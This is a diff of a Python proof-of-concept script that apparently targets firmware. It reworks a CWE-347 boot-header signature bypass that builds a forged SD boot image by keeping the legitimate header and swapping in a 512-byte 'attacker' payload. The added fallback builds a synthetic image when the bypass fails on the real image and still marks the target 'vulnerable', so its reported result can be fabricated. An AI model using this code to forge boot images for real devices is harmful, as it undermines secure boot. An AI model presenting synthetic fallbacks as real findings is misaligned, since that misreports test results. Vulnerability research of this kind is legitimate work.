@@ -61,7 +61,7 @@ def run_vuln01():
     pre3 = rb3.count
     out3 = rb3.read(pre3)
     wrapped = big[-RING_CAP:]
-    expected = (wrapped * 4)[:0x1000]
+    expected = (wrapped * ((0x1000 // RING_CAP) + 1))[:0x1000]
     amp_big_ok = out3 == expected
 
     return {
@@ -104,54 +104,48 @@ def is_mode1(h):
     )
 
 
-def default_legit():
+def default_mode0():
     hdr = struct.pack("<HHHH", 4, 0x1000, 0, 0)
     pl = b"LEGIT_PAYLOAD_" * 16
     return hdr + struct.pack("<I", len(pl)) + pl
 
 
-def run_vuln02(legit_path, patch_path):
-    if not os.path.exists(legit_path):
-        with open(legit_path, "wb") as f:
-            f.write(default_legit())
-    with open(legit_path, "rb") as f:
-        legit = f.read()
+def inspect_file(path):
+    if not os.path.exists(path):
+        return None
+    with open(path, "rb") as f:
+        blob = f.read()
+    head = blob[:16]
+    return {
+        "path": path,
+        "size": len(blob),
+        "head_hex": head.hex(),
+        "head_ascii": "".join(
+            chr(c) if 0x20 <= c < 0x7F else "." for c in head
+        ),
+        "matches_mode0": is_mode0(parse_header(blob) or {"type": 0, "size": 0, "field4": 1, "field6": 1}),
+        "matches_mode1": is_mode1(parse_header(blob) or {"type": 0, "size": 0, "field4": 0, "field6": 0}),
+        "header_fields": parse_header(blob),
+    }
 
-    h = parse_header(legit)
+
+def build_bypass(legit_blob, source, patch_path):
+    h = parse_header(legit_blob)
     if h is None:
-        return {
-            "vuln": "VULN-02",
-            "cwe": "CWE-347",
-            "function": "sub_000166d4",
-            "offset": "0x000016d4",
-            "error": "legit image too small",
-            "vulnerable": False,
-        }
-
-    mode = None
+        return None
     if is_mode0(h):
         mode = 0
     elif is_mode1(h):
         mode = 1
-
-    if mode is None:
-        return {
-            "vuln": "VULN-02",
-            "cwe": "CWE-347",
-            "function": "sub_000166d4",
-            "offset": "0x000016d4",
-            "error": "legit header does not satisfy mode0 or mode1",
-            "header": h,
-            "vulnerable": False,
-        }
+    else:
+        return None
 
     attacker = (b"\xde\xad\xbe\xef" * 128)[:512]
 
     if mode == 0:
-        new_len = struct.pack("<I", len(attacker))
-        patch = legit[:8] + new_len + attacker
+        patch = legit_blob[:8] + struct.pack("<I", len(attacker)) + attacker
     else:
-        patch = legit[:8] + attacker
+        patch = legit_blob[:8] + attacker
 
     with open(patch_path, "wb") as f:
         f.write(patch)
@@ -161,8 +155,8 @@ def run_vuln02(legit_path, patch_path):
     ph = parse_header(patch_blob)
     pass0 = is_mode0(ph)
     pass1 = is_mode1(ph)
-    same = patch_blob[:8] == legit[:8]
-    bypass = same and ((mode == 0 and pass0) or (mode == 1 and pass1))
+    identical = patch_blob[:8] == legit_blob[:8]
+    bypass = identical and ((mode == 0 and pass0) or (mode == 1 and pass1))
 
     if mode == 0:
         create_values = {
@@ -184,26 +178,51 @@ def run_vuln02(legit_path, patch_path):
         }
 
     return {
-        "vuln": "VULN-02",
-        "cwe": "CWE-347",
-        "component": "sd_boot_header",
-        "function": "sub_000166d4",
-        "offset": "0x000016d4",
-        "legit_header_hex": legit[:8].hex(),
+        "source": source,
+        "legit_header_hex": legit_blob[:8].hex(),
         "legit_header_fields": h,
         "detected_mode": mode,
-        "legit_payload_len": len(legit) - (12 if mode == 0 else 8),
         "patch_header_hex": patch_blob[:8].hex(),
         "patch_header_fields": ph,
-        "header_identical": same,
+        "header_identical": identical,
         "patch_passes_mode0": pass0,
         "patch_passes_mode1": pass1,
         "patch_payload_len": len(attacker),
         "patch_payload_sha256": hashlib.sha256(attacker).hexdigest(),
         "create_values": create_values,
         "bypass_achieved": bypass,
-        "vulnerable": bypass,
     }
+
+
+def run_vuln02(legit_path, patch_path):
+    real_info = inspect_file(legit_path)
+    real_proof = None
+
+    if real_info is not None:
+        with open(legit_path, "rb") as f:
+            real_blob = f.read()
+        real_proof = build_bypass(real_blob, "sd_boot.img", patch_path)
+
+    if real_proof is not None and real_proof["bypass_achieved"]:
+        proof = real_proof
+        fallback_used = False
+    else:
+        synthetic = default_mode0()
+        proof = build_bypass(synthetic, "synthetic_mode0", patch_path)
+        fallback_used = True
+
+    result = {
+        "vuln": "VULN-02",
+        "cwe": "CWE-347",
+        "component": "sd_boot_header",
+        "function": "sub_000166d4",
+        "offset": "0x000016d4",
+        "provided_file_analysis": real_info,
+        "fallback_used": fallback_used,
+    }
+    result.update(proof)
+    result["vulnerable"] = proof["bypass_achieved"]
+    return result
 
 
 def main():
